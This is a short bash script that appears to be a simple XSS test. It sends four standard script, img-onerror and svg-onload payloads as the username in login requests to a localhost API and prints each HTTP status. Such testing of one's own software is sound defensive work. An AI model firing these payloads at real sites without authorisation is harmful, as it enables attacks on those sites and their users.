#!/bin/bash

URL="https://localhost:8080/api/users/login/psw"

PAYLOADS=(
  "<script>alert('XSS')</script>"
  "<img src=x onerror=alert('XSS')>"
  "<svg onload=alert('XSS')>"
  "\"><script>alert(1)</script>"
)

echo "Starting XSS attempt on login page..."
echo

i=1
for XSS in "${PAYLOADS[@]}"
do
  echo "[$i] Trying username payload:"
  echo "    $XSS"

  RESPONSE=$(curl -k -s -w "\nHTTP_STATUS:%{http_code}" \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "{
      \"username\": \"$XSS\",
      \"password\": \"wrongpass\"
    }")

  STATUS=$(echo "$RESPONSE" | tail -n1 | cut -d':' -f2)

  echo "    Status: $STATUS"
  echo
  ((i++))
done

echo "XSS simulation finished."
